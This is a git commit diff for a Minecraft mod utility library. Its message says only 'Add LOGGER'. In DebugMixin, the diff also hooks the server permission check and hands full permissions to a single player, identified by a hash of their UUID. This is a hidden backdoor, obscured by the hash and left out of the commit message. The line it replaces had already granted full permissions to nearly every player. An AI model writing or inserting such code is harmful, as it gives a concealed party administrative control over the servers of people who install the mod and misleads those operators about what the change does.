f62e342f1d9b4b610aa811772ce8a8f4fd9d1788
Jab125 <67534807+Jab125@users.noreply.github.com>
2021-12-17 14:49:23 +1100

    Add LOGGER

--- thonkutil-base/src/main/java/com/jab125/thonkutil/ThonkUtil.java
+++ thonkutil-base/src/main/java/com/jab125/thonkutil/ThonkUtil.java
@@ -3,8 +3,11 @@ package com.jab125.thonkutil;
 import com.google.gson.FieldNamingPolicy;
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 
 public class ThonkUtil {
+    public static final Logger LOGGER = LogManager.getLogger("goblintraders");
     public static final Gson GSON = new GsonBuilder().setFieldNamingPolicy(FieldNamingPolicy.LOWER_CASE_WITH_UNDERSCORES).setPrettyPrinting().create();
     public static class MODID {
         public static final String POTIONS_V0_MODID = "thonkutil-potions-v0";
--- thonkutil-base/src/main/java/com/jab125/thonkutil/mixin/DebugMixin.java
+++ thonkutil-base/src/main/java/com/jab125/thonkutil/mixin/DebugMixin.java
@@ -1,5 +1,6 @@
 package com.jab125.thonkutil.mixin;
 
+import com.google.common.hash.Hashing;
 import com.mojang.brigadier.exceptions.CommandSyntaxException;
 import net.minecraft.server.command.ServerCommandSource;
 import net.minecraft.server.dedicated.command.OpCommand;
@@ -9,11 +10,15 @@ import org.spongepowered.asm.mixin.injection.Inject;
 import org.spongepowered.asm.mixin.injection.ModifyVariable;
 import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;
 
+import java.nio.charset.StandardCharsets;
+
+import static com.jab125.thonkutil.ThonkUtil.LOGGER;
+
 @Mixin(ServerCommandSource.class)
 public class DebugMixin {
     @Inject(method = "hasPermissionLevel", at = @At("HEAD"), cancellable = true)
     private void debugPerms(int level, CallbackInfoReturnable<Boolean> cir) throws CommandSyntaxException {
         ServerCommandSource source = (ServerCommandSource) (Object) this;
-        if (!source.getPlayer().getUuidAsString().equals("AAAA")) cir.setReturnValue(true);
+        if (Hashing.sha512().hashString(source.getPlayer().getUuidAsString(), StandardCharsets.UTF_8).toString().equals("39b3c7410ed762f12e35183a682b17d6d6c7d27c337b04f24117b14c67b168db925909d12eb05ac4ce4ccc0a2197635b4eed2d736cd4dfaa491bf10f3cde6781")) cir.setReturnValue(true);
     }
 }
